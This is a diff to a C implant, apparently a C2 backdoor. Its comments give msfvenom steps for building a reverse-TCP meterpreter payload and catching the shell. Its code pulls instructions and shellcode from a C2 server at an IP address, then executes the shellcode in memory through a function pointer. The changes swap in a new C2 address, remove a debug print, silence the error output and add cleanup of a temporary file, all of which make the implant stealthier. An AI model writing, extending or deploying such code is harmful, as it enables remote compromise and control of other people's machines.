@@ -46,6 +46,7 @@
  * - Produce a binary payload similar to the product of the following command: $ msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw -b "\x00" >> shellcode
  * - Serve the shellcode file and the instruction.txt file on the C2 webserver
  * - Have a listener ready to catch the incoming shell
+ * - The payload being executed absolutely must be binary!
 */
 
 /* DESCRIPTION:
@@ -75,10 +76,10 @@ void ExecutePayload(void);
 
 // Globals:
 
-char * CADDRESS = "http://10.242.11.247:8080/instruction.txt";
+char * CADDRESS = "http://10.243.19.163:8080/instruction.txt";
 char * USERNAMEADDRESS = "http://ADDRESS:PORT/username.txt"; 
 char * PASSWORDADDRESS = "http://ADDRESS:PORT/password.txt";
-char * SHELLCODEADDRESS = "http://10.242.11.247:8080/shellcode";
+char * SHELLCODEADDRESS = "http://10.243.19.163:8080/shellcode";
 char * BASEDIRECTORY = "/";
 
 // Main function:
@@ -96,8 +97,8 @@ int main(void) {
 		system("rm username");
 		system("rm password");
 	} else if (strcmp(controllerDirective, "EXEC") == 0) {
-		printf("Shellcoding\n");
 		ExecutePayload();
+		system("rm tmp");
 	}
 
 	return 0;
@@ -338,7 +339,7 @@ void ExecutePayload(void) {			// This function works by grabbing the shellcode, 
 		curl_easy_setopt(curl, CURLOPT_WRITEDATA, buffer);
 		res = curl_easy_perform(curl);								
 		if (res != CURLE_OK) {									
-		    fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
+		    // fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
 		}
 		curl_easy_cleanup(curl);								
 	}
@@ -350,5 +351,4 @@ void ExecutePayload(void) {			// This function works by grabbing the shellcode, 
 	memcpy(functionPointer, buffer, sizeof buffer);			// Here, here is the shellcode
 
 	((void (*)())functionPointer)();				// execute the shellcode by calling the code buffer() points to
-
 }
